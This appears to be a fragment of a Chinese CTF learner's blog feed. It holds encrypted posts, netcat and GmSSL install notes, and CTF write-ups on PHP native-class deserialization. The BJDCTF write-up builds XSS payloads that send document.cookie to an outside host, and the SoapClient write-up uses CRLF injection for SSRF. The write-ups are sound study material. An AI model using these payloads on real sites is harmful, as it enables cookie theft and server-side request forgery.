data-hmacdigest="6a04f9115a7cc5b2a5a7b09e0e2d98a7e042ccd824882cabed7dd7d6ef118a61">4630436162ade97ba2718b7d0c4b3b631ce3008cbd2d9c6a68213d361e81f8e1bd659c61fc47becc7e1bf24793214fed6809c2537434d015b454b0630e7e676d599f3e122614fa106c5616d726d96356e07df6e33fa37ffd373f3db9595cc384d834297193f4da45398a03468496cbcbb4fe7221f3ec361afc5b628abcb2286c1f5ab66cfd8c76588fe4ac7ab2cd47a60040f10af0952580ac1d5a7969464ffbd60364d997cc44f2800f2a8ac7b94e306be962889142c62f9484b29fef522ff76bc0f4850473e2f41a03ad981d96ca2996ffd9332bb1c13ae5e44808535036bd2f0601f5685543f30158dda18492bbe78fcf73ccc9deab3b4657df08e08c5721342a1e72a3a7a25a62c41a0af6e1b60adaa2fdaab8518f2acb3ae6244d68a17208f878e3f3e271a07952c8f8e416d2bc8ea86d5d00846361658a8cabcbd966451151b542f59207912d686c7e77d2400121f2421dfc82278ee6a09ba5ef44bc3a37a6fe27b0445dd029d9e2f898ead232ca8aaa3af9a66af664ee4ee11775a187cdf48f239e4aff4bc4550b2cba2249fee37d1d6a1ca433660af6eae6a60e17ecae1fbcc1b2eee8e5ad564027535fd8851b8609c2bcb5e4ba7837cee47f8ead0a2240188c91917be88bfa05980858feb90085a710e362594ed054e29334fd5392b7ea9fe62102886202269f9ae2c9b37a1369beecc684b6aa2edbb4f674b8dd34650c9943abf63eb18d5deaf70bf83b91390b8ee3587bc36422176752d07c88ad536b8d83c652253429a9af24855a053700cba6d536a0653e7ab6ec36cc3d033dc686eb58797518317265c34c1cfc1bf586fd95c9c3f0815e70afa760751dd83cdbc9fb248d5acd960bb5ea2ec39d657f60ee23b820e5eadbbbca7f7d063dfb83790d93a5156da6fd60c20e98804dbc181a5d70a5adce837935d0f3a4c220429e402b13b11d07e43c6895fabadec8d07e299da5feb33d4e4aa49fd2dcc9a4262a401127f2d0cbf2fb638619a0bccf74f8a9aeb7b4ef4b85458e5d8d0df8b8d7a62b119dfde61ec57f64d5c3ea6f450e915c395f337b40e2a9997d40d37b9a92d0249d91d89d6afe81d6e223686b6069ca247db65fffe825f38135608244f8a8db5d9a71952e0a64864e28989449f402d5472d962ff7faeea63ad2ecba6660c66097c1a414dee0b7fd0172935079d40727473d3abf3cc9abaa568991c9cfc063f147eab0e7767479f7d0fc4510a30d211689bce97d98480d24e278fc56af144f11a6feb95f8b9d2ff7feea07d76061d9848ed30631c8d4b94fb26d2b5e9b55820cda86888c5f1a593ac56bef7c1019474093275c8a7134da7fc0cdc7176a76be438b35d7c01c3ac9d57a8c8759525790d9ae485bf8f16dd54ab59a904a9dc744ffb64583fde682d40f6492ba730115d172299e10bdbd345859a23cb987fe57f008d9a38362cca3fbe9992260b0fba5a8f299c995c15ee23154676cdbcd60905c96545a4d057ee6fed4dc4d7b9e1648c7fbb3c07d3af44567190c8cb334a2bfba2a5a054ca92015482a5062b048d665c6319ca9ca4e63e91c0fe830a66f91a20bf63b2e2064094cdd963dbf7f8e4a008e9d8f38434bb4d9156e92ddab700b3aaa13fb1f2abdd77032c2d99acc5edd62cda0b92e780a61110f6d0103a06bf4afb6932ffaca1fce56e2f39953eda30a086f6eaaa795d371e54c0b473174dcf17d11d748806e6ed47101e4face7732221bcc12a082b379db680804c6a7604f4937429f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10安装netcat</title>
      <link href="/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/"/>
      <url>/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows10安装netcat"><a href="#Windows10安装netcat" class="headerlink" title="Windows10安装netcat"></a>Windows10安装netcat</h3><p>1.下载地址</p><ul><li>netcat-win32-1.12</li></ul><p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>注：下载的时候记得关防火墙</p><p>2.操作</p><ul><li>解压netcat-win32-1.12.zip</li><li>配置解压好的目录路径到PATH环境变量</li><li>测试</li><li>打开命令行，输入以下命令:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -h</span><br><span class="line">nc -l -p 9999   -----&gt;监听9999端口，回车后即可发送内容</span><br></pre></td></tr></table></figure><p>不配置环境变量直接使用netcat</p><ul><li>直接将解压目录下的nc.exe复制到C:\Users\username目录下即可</li><li>Win+R输入cmd即可进行netcat连接</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php原生类学习</title>
      <link href="/2024/06/30/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/30/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP中利用原生类的反序列化以实现XSS"><a href="#PHP中利用原生类的反序列化以实现XSS" class="headerlink" title="PHP中利用原生类的反序列化以实现XSS"></a>PHP中利用原生类的反序列化以实现XSS</h2><p><a href="https://blog.csdn.net/weixin_63231007/article/details/128472820">https://blog.csdn.net/weixin_63231007/article/details/128472820</a></p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121780909">https://blog.csdn.net/unexpectedthing/article/details/121780909</a></p><h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="BJDCTF 2nd xss之光"></a>BJDCTF 2nd xss之光</h3><p>1.先是git泄露，用Githack拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>2.利用php内置类，寻找有__toString类的方法</p><p>ERROR：</p><p>​ERROR这个原生类适用于php7版本</p><p>​Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。</p><p>Exception</p><p>​适用于php5、7版本</p><p>​这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用。</p><p>利用如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>传参，成功弹窗</p><p>3.<strong>几种方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$y1ng</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//window.open 是 javaScript 打开新窗口的方法</span></span><br><span class="line"></span><br><span class="line">也可以用window.location.href=<span class="string">&#x27;url&#x27;</span>来实现恶意跳转</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;http://8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn&#x27;+document.cookie&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">或者用<span class="title function_ invoke__">alert</span>(document.cookie)直接弹出cookie，但此题不行，可能开了httponly（见附录）。</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$y1ng</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4.<strong>传参后Cookie查看flag</strong></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><h5 id="什么是HttpOnly"><a href="#什么是HttpOnly" class="headerlink" title="什么是HttpOnly?"></a>什么是HttpOnly?</h5><p><strong>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Soap原生类</title>
      <link href="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>  利用SoapClient类进行SSRF</p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p><p><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a></p><p>1.拿到题目之后，发现需要传入一个反序列化的参数，并且调用一个不存在的 getFlag()方法，而我么们知道，调用一个不存在的公共方法，就会自动调用__call方法，因此我们应去联想哪些原生类有<code>__call</code>方法，贴一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.想到这道题的提示，很容易想到ssrf中的SoapClient类，并且它也存在__call方法!</p><p>在php手册上查询发现，这个方法可以调用远程soap方法！</p><p><img src="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/026a20a84124471225829921876bc8f9.png" alt="026a20a84124471225829921876bc8f9"></p><p>那现在思路就清晰了：我们需要利用SoapClient类构造一个post请求，让ip&#x3D;127.0.0.1，携带token&#x3D;’ctfshow’。</p><p>3.首先需要构造UA头，绕过127.0.0.1的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span></span><br></pre></td></tr></table></figure><p>“\r\n”是CRLF注入，代表着”回车换行”，而我们知道，请求头和请求体之间是存在换行的，因此Content-Length和token之间存在了两对”\r\n”。之所以要写两个127.0.0.1，是因为代码中使用了两次array_pop,每次会删除最后一个数组元素 ，因此为了将$ip赋值给127.0.0.1，所以需要写两个127.0.0.1,Content-Type是发送请求体的长度，”token&#x3D;ctfshow”,长度为13</p><p>4.查询手册，找到SoapClient类的构造方法所需要的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client=new SoapClient(null,array(&#x27;uri&#x27;=&gt;&quot;127.0.0.1&quot;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br></pre></td></tr></table></figure><p>第一个参数为null,表示非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求。</p><p>第二个参数中，可以设置uri,location,user_agent等值。</p><p>uri：指定命名空间URI(Namespace URI)</p><p>location: 指定Web服务的URL地址</p><p>user_agent：指定HTTP请求的User-Agent头</p><p>5.整合以上数据，进行序列化，然后传参，访问flag.txt得到flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serializez</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>netcat-win32-1.12</p><p>拓展：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">soap是什么</span><br><span class="line">1.soap是webserver的三要素之一(SOAP,WSDL,UDDI)</span><br><span class="line">Web服务的三要素通常指的是：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP (Simple Object Access Protocol)：</span></span><br><span class="line"><span class="code">        SOAP是一种基于XML的协议，用于在Web服务中交换结构化数据。它定义了一种消息格式，使得不同的系统能够通过网络进行通信和数据交换。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL (Web Services Description Language)：</span></span><br><span class="line"><span class="code">        WSDL是一种用于描述Web服务的XML语言。它提供了Web服务的公共接口的详细描述，包括服务的可用操作、输入和输出参数、消息格式以及如何访问服务的网络地址等。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI (Universal Description, Discovery, and Integration)：</span></span><br><span class="line"><span class="code">        UDDI是一个用于Web服务的目录服务，它允许企业注册自己的Web服务，并且允许其他企业发现这些服务。UDDI提供了一种标准化的方式来发布、查找和集成Web服务。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">这三个要素共同构成了Web服务的基础架构，使得Web服务能够跨不同平台和语言进行交互。SOAP定义了数据交换的格式，WSDL提供了服务描述的标准，而UDDI提供了服务注册和发现的机制。通过这些技术，Web服务可以被创建、发现和使用，从而实现不同系统之间的互操作性。</span><br><span class="line"></span><br><span class="line">更容易理解的方式，我们可以将Web服务的三要素SOAP、WSDL和UDDI比作一个餐厅的服务系统：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP（服务菜单）：</span></span><br><span class="line"><span class="code">        想象一下，SOAP就像餐厅里的菜单。当你走进餐厅，服务员会给你一份菜单，上面详细列出了所有可供选择的菜肴以及它们的描述。同样，SOAP是Web服务用来告诉其他计算机系统，它能够提供哪些服务，以及这些服务需要什么信息来执行。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL（服务介绍）：</span></span><br><span class="line"><span class="code">        WSDL就像餐厅的介绍手册。当你想知道餐厅提供哪些类型的菜肴，或者你想了解如何点菜，这本手册会详细告诉你。在Web服务中，WSDL提供了服务的详细描述，包括服务能做什么，如何与服务交互，以及服务的地址等信息。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI（餐厅目录）：</span></span><br><span class="line"><span class="code">        UDDI可以比作是一本餐厅黄页，它列出了所有可用的餐厅以及它们提供的服务。如果你想找到提供特定菜肴的餐厅，你可以查阅这本黄页。在Web服务的世界里，UDDI允许人们查找和发现不同的Web服务，了解它们提供的功能，并找到如何访问这些服务的方法。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">通过这个例子，我们可以将Web服务的三要素想象成在餐厅中点餐的过程：首先，你通过黄页（UDDI）找到你想尝试的餐厅；然后，你通过介绍手册（WSDL）了解餐厅提供的服务和如何点菜；最后，你使用菜单（SOAP）来实际下单，享受服务。这样，不同的计算机系统就像顾客一样，可以通过这些“要素”来发现和使用Web服务。</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/en/extensions.alphabetical.php">https://www.php.net/manual/en/extensions.alphabetical.php</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hd</title>
      <link href="/2024/06/22/hd/"/>
      <url>/2024/06/22/hd/</url>
      
        <content type="html"><![CDATA[<p>​国密：SM3，kali安装</p><p>1.git clone <a href="https://github.com/guanzhi/GmSSL.git">https://github.com/guanzhi/GmSSL.git</a></p><p>2.解压（如果需要）</p><p>如果你下载的是压缩包（如<code>.tar.gz</code>或<code>.zip</code>），你需要先解压它。但如果你使用的是<code>git clone</code>命令，则不需要这一步，因为Git已经为你处理了下载和解压的过程。</p><p>3.进入源代码</p><p>cd GmSSL</p><p>4.编译配置</p><p>.&#x2F;config –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl –openssldir&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl no-shared</p><p>5.make编译</p><p>make</p><p>6.安装</p><p>make install</p><p>7.配置环境变量</p><p>安装完成后，为了让系统能够找到<code>gmssl</code>命令，你需要配置环境变量。这通常是在你的shell配置文件（如<code>~/.bashrc</code>或<code>~/.bash_profile</code>）中添加一行来指定<code>PATH</code>变量。打开文件并添加如下行：</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;gmssl&#x2F;bin</p><p>然后保存文件并运行<code>source ~/.bashrc</code>（或对应的shell配置文件）来使更改生效。</p><p>8.8. 验证安装</p><p>最后，你可以通过运行<code>gmssl version -a</code>命令来验证GmSSL是否成功安装。如果命令能够正确返回GmSSL的版本信息和其他相关细节，那么说明安装成功</p><p>二、py -m pip install gmssl</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.21记录</title>
      <link href="/2024/06/21/6-21%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/06/21/6-21%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b450eb5c94eec171c6ce05367204478ff46a205301ac8608ce3d1082435d5f99">5eeca1580f39ade72a7db71e8e859a8768655ad5e9e43f4bfefde1bf7a30a9fab81f627cf8ec2367cc45da3050d344d8e42a45c6e8ead08b331f614dac1baa7450c432e3018356d8750f03eae3ac28385353627acc3f8c730ba7b206cc5a23d66109f5f47d9801286851bacb6cb45b76b0b90d1941058dd18fa24d006c30211406d3a28485b83bd97e2de16883fce4cf1a6d5fca6f49316e4d3c3ef5f38f54241988f259de7b64dc6731cf8f21a4b18cd939c50fe82c394898a772b57fd5a689ae22ff6d89e453b476a16408981f187f9a0d48a9780bdfa6e32e7263fed283a69cc23bcdc75e66f03b10a6d7fd014841c9300872d981c04d3a8e9ccf9d081a755d461f5a5a496d5067ed6bd7faf03d2572dc7a4ad1dc5641759239c2adaeb407c6f4ee7d2d9770b6689fc0403910cd7f1373aa02a227540fc302d5c965c2781e7628bb82f909a78acf17388e5e67bf88f210706f628e6f65bfcb532dcce292063aba9d3e546836c14862f7cbc76e3e95eedd258006f93127c70a969764752aa767236759a277282b55119d577937f7aee8460f24441726c02803ff4ddc2fb6cdf2908703931b777d813af975dd886cecb204e7a352b1fb720c59679692163c81dfadc9be621445201a146a52728592fc00b0414059b62f966f2ef1ccc6fb0df7f69f98e3be83d89bce05693e0573f9fc0637c115ba95ac700d328a03edde8f000cf6fc6049fa427da5b2f58e4a02d59048b74132f5d188594202465a0a5ad7adac3e72edaecbf48bd6cc32eea52c9075feaf3cd458a6548a671f84e141d619845efc4a3b07c314894db04015a415fa012fad75a32e7846a618ba7057bfba04803b60364ae6f2eeefb617dbcd7ec4e0b3bd76859349014b057a09394aebb5571462bc7300664387563bbb58863e03334ee77fafd775646fe779c642a0cf41b48d150d0915d9f32e83c5476cc6b9e71ffefcc7f11b7fbd83a153c9904b4b01866d6be112c5b15478152bba948dfa55154a57de83bd68a4139801f2ac8e236806af188a404c917520c3f2af75f219d867ea7734a580982e899b42f253ebae24ed3c09bc5a6161e85d09497c8d5757f47f3b1a477d566732ec0ecd8748bc447a418aaf96a6c7536bb6005f52e621c6f301adcac9d9a83e2a2a59d2dab45ab42598e4e69e90be1e83d7be5917564f80cf1a9f549703f08285ab685b64e476ea85138fb6d1a55132e4f14bce75353deba304106a5a260f1fbf061e826f9ed20f45d51415b917028024da82add7797652a6740c81fe9015aca7e4617cf4e859694bc407219c052b4690fce5ebc936987737e7a14ede014bc1979b914bfbcc80466e99ea726c77d0f8933c5e454449c63b16e8c9e55eff092465c30519ed70a87c1af913d1ba3af28799ef8aedf6a3ece194210371502064655bcf2f55018c6428be256fc80521d7a9d7ced75406be1c182d46a5072c04d50e94bdc27cd5ca529491155c69c459de00f82ae4bbab15531ff7e7388944e3cddb3bb748af691ea98992cc241b7912e3cf533754e832ee476ba627dc9e856c29532006997ac92bc5853fcc553b98e28b11fb8935fce7b5384b2e638c48dcc12e2b64060fdab8ce0c2939b1863a0cfa16329c373ca0096f4e6ff74724639dd7907754942003608f282388130a48e56a0c4b16e1907caf048648e0893614676c48b6e04487ffe507ca9e1821dd1bb107fb19b17b8fee7b2dbd054571f54efd6e7c53512348180f884d84600f5eeaf8b3da28d1b873e89610d47dcc50c323251b6de7a8ae6e69907390441a17b83b427940716f62fe52aad4b6109b3ec2209631757bcd65e4d553900c7a44eea4949d9fa6af196f7898feba25f6c438d870f1b924c726a555e869c16a85cb09b0cf0cce212398b9819d5c8104b7693ea892e0effd52581d20e3a01af9148bffce0ef56e8b0c41db3c0a52b047c3fcfbf5ec02d73361da82e9b6438662654bf16eb2680477c66a846412c22bbc834b4a02ccda8f38c4ce55988ca76cea73d13a1ca60f82468a1c4861790ce69bfcceb397dc2bd1b1da4615157cc8944361464cb41d233e37b8d0e9e39ff4b385ae27f219e1171e208bb3292ceaae61e13cdce186f74178960f186074212ac856f0991f44c74cd29dbedd03c36ba0f8b08d9dfa7d733786c66242b7b31d569935982c5d61bf6a22e7ab507a620de17e89eb0b4565ca2e23a1bcb0d948c1660b1adcca444fa8fab565168ec8cf0a38dbe8180af6cebc6e441c2367f925a4cbbc5c17cc38adc95796d035442997b867445b2e68355ce4d733cc1927183a08bafc635089d98dcb8be93fc898ab7604d233c4fe65ca0aa8ea06f9ff037fc331b67c4ad0e696149cec8e57b6ee58d52393cf97c75aee723c412a74f7c35cab891c39fa5d0a4699529becbdbda7761f756a4f9f21588b465f8ee89240444d348b12d0536274dceda93197662988bc5918ba855f7aee5dd1b54fe02807fb26bf4db7a98b230f730a89b5b8d3f0fd79c4627ca9884b7b2da8bb77198eac4a4450aec3170ba31062c5c4515721104fbafa88384d41d9832814b9cd6b0cc27b98e7f0779487fc9ff7913741a3446325dc66b7606abf2a0030eaf390b0dccaf1356fbf645fdbfd5ec76342cfd285ffa999192b0c7e3e0ecb00bf515d3bbbbc5252662fa420f5a8bf77f9d4668f3f1cd3b7e0fcfa7dff777ba8c36df7292afaef5d97547d58978dff52ec81ef8dfb1f25f3768a8e61e80fc9e0f4bb2367daa32dd01dae396bbec41208223cf26d418d14a3753400f44a905b9174646f93b1a7eb6ee533588f3486ff7c93011a846a35a15a208690c6dce5692ffcdcd54661c0081f4b840f0796e4f2240a57c1b4ddd1ef1f0177c0df4309d6c014c4543f1f3263d3db1a86a007f78ef8d74ba1cf459bd20af2500f1e1fd28e3ff4e2cc5270de4b562e42a6e295fe496d74a36989c242e5d27c19866654b4e5474820d5900a5b93dc89050cc32893901e9d456a678a1d291a17e83c5cac6065f290526fd2c292eb56dc7f73c00710709b502e00fc2748b2dd44c54513829f2661ef585c7c18ec536d798eba6f7233296adcf6b0587e1eee3bf7a0650f7dc0fab8138ef9aef1ac75d061e17ccecb8f24bd56faf83c91232060fdf5113fcb8b4668933cf3da8c7391dcf14ea7a75a20cab1ea1c431459b5f0939b5de07ab3780d5b7af03ee94cdf6e21319ed7924182f5a91ce5777871192b248bf3ae426df2559db9ff90d9ccdd9cdc512f01987f0af0eb74b505faf3682afc436b9a3a0825428bc75c1be493fb83148f1670721fdf60bc0d791c9cd2d55d9de5c43f43e3c919cb9fe645ef90597cbf0599f993fe55a76dea14403ada246a73e836441dcad4079af52392e4770e750159e5274759a6c7900119c29338acd01c821de9c61374d036ee36d1a69d9872a57d163388f2ee0eeaa629c36c5f9a0b2bc665d4a912e1fc326045b7eb44656275b74c8c99f685cea52420d785419f70bc693d9c2e6a6688b5772a000ba1f173fd81fd8331060129f3bd9e9f46aae4eea2752d0e7f10563650927982cb66bf7d0b21392210417bc3071f9223c51e149f3a844443fa5d0818881a4465fdf374277d335e858181bf71ce504edd274a05f443a0b8080dcc11d1814dde520d5d0ef96f3c38ddbc39e751a9dc19a0fb189a6391858cd9bbfb8369642fb94cd425e9ce664519d08759a5bda5fd8792a8e1f6ff5a03db79cf76821dd9377f4b08074e411a73b3c15ed7e8b336e4f144f30cef7d9fb23a62efbc44eb6ca993a5b9af3b6b0580cd18b130836720d667f572eb8fff9